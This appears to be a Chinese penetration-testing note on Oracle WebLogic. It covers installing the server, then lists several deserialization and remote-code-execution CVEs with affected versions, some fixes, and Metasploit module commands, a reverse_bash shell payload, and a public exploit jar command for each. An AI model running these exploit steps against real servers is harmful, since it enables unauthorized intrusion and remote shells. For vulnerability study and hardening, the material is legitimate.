---
title: Weblogic
---

## WebLogic简介

WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件；

WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器

**安装WebLogic环境**

1、下载所需版本

https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

2、解压出来，打开`install.cmd`脚本（一路下一步）

3、设置口令

口令必须至少包含数字字符，且至少包含一个数字或一个特殊字符

4、勾选管理服务器，点击创建

5、双击`startweblogic.cmd`启动服务

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\startweblogic.cmd
```

6、访问控制台

```http
http://ip:7001/console
```

7、部署网站

点击–>部署–>安装–>上载文件–>部署档案：选择网站文件xxx.war–>下一步–>下一步–>完成

## [CVE-2019-2725]-wls反序列化

**漏洞概述**

WebLogic wls9-async反序列化远程命令执行漏洞

攻击者利用该漏洞，可在未授权的情况下远程执行命令

```http
#影响范围
Coherence 3.7.1.17
Coherence & Weblogic 12.1.3.0.0
Coherence & Weblogic 12.2.1.3.0
Coherence & Weblogic 12.2.1.4.0
```

**漏洞利用**

```bash
use multi/misc/weblogic_deserialize_asyncresponseservice
set payload cmd/unix/reverse_bash	#target->unix,这个payload实测成功
```

这个模块也适用于Weblogic XMLdecoder反序列化漏洞 (CVE-2017-10271)

## [CVE-2020-2555]-T3反序列化

**漏洞概述**

WebLogic T3协议反序列化远程命令执行漏洞

Oracle Fusion中间件Oracle Coherence存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求

获取Weblogic服务器权限，执行任意命令

```http
#影响范围*
12.1.3.0.0
12.2.1.3.0
12.2.1.4.0
```

**漏洞利用**

```bash
use exploit/multi/misc/weblogic_deserialize_badattrval
```

**修复建议**

1、直接升级weblogic到最新版本或安装升级补丁

2、如果不依赖T3协议进行JVM通信，禁用T3协议

进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器

在连接筛选器中输入：`weblogic.security.net.ConnectionFilterImpl`

在连接筛选器规则框中输入 `7001 deny t3 t3s` 保存生效（需重启）

## [CVE-2020-2551]-IIOP反序列化

**漏洞概述**

攻击者通过IIOP协议远程访问WebLogic Server服务器上的远程接口；

传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码

```http
#影响版本
WebLogic 10.3.6.0.0
WebLogic 12.1.3.0.0
WebLogic 12.2.1.3.0
WebLogic 12.2.1.4.0
```

**漏洞验证**

网上暂无可稳定利用的EXP（部分无法利用），可尝试

https://github.com/Y4er/CVE-2020-2551

**漏洞分析**

https://www.anquanke.com/post/id/197605

https://www.anquanke.com/post/id/206494

**修复建议**

1、补丁升级：登陆https://support.oracle.com后，下载最新补丁
2、临时规避措施：通过禁用IIOP协议对漏洞进行缓解

## [CVE-2020-2883]-T3反序列化

**漏洞概述**

该漏洞是2555补丁的绕过

```http
#影响版本
WebLogic 10.3.6.0.0
WebLogic 12.1.3.0.0
WebLogic 12.2.1.3.0
WebLogic 12.2.1.4.0
```

**漏洞利用**

```bash
use multi/misc/weblogic_deserialize_badattr_extcomp
```

**修复建议**

1、升级补丁：登陆https://support.oracle.com后，下载最新补丁
2、临时规避措施：通过禁用T3协议对漏洞进行缓解

## [CVE-2020-14644]-远程命令执行

**漏洞概述**

```http
#影响版本
12.2.1.3.0
12.2.1.4.0
14.1.1.0.0
```

**漏洞利用**

下载EXP：https://github.com/potats0/cve_2020_14644/releases/tag/0.0.2

```bash
java -jar cve-2020-14644.jar 127.0.0.1 7001 whoami
```

**漏洞分析**

https://www.cnblogs.com/potatsoSec/p/13451993.html

## [CVE-2020-14882]-未授权命令执行

**漏洞概述**

```http
#影响版本 （有console控制台存在的）
10.3.6.0.0
12.1.3.0.0
12.2.1.3.0
12.2.1.4.0
14.1.1.0.0
```

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码

**漏洞利用**

```bash
use exploit/multi/http/weblogic_admin_handle_rce
```

**修复建议**

配置 WebLogic 禁用 Console 控制台